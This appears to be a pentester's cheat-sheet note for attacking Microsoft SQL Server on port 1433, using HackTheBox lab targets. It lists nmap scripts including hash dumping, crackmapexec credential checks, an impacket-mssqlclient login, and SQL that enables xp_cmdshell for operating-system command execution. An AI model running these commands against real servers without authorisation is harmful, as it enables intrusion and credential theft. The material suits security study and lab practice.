---
title: Port 1433 - MSSQL
draft: false
tags:
  - mssql
  - crackmapexec
  - impacket-mssqlclient
  - cme
---
## Enumeration

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

## Bruteforce

Check whether creds found is valid on MSSQL:
`
`crackmapexec mssql manager.htb -u Desktop/user.txt -p Desktop/user.txt --no-brute --continue-on-success`

## Interaction

Using **impacket-mssqlclient**, interact with the database:
`
`impacket-mssqlclient -port 1433 10.10.11.236/operator:operator@10.10.11.236 -window`


Below are example interaction:

```sql
SELECT name FROM master.dbo.sysdatabases;
USE master;
select table_name from information_schema.tables;
SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, NUMERIC_PRECISION, NUMERIC_SCALE from information_schema.columns where table_name = 'spt_fallback_db';
```



  

## Command Execution

Try **xp_cmdshell** and **xp_dirtree**:
  

```sql
xp_dirtree
xp_cmdshell
EXEC xp_cmdshell
EXEC xp_dirtree
```



  If they are not enabled, try enabling them:

  

```sql
enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

  

### Example CME

If there's **IIS** running and **xp_dirtree** is enabled:



```sql
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```



On [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server), there's more detailed guide on pentesting MSSQL.
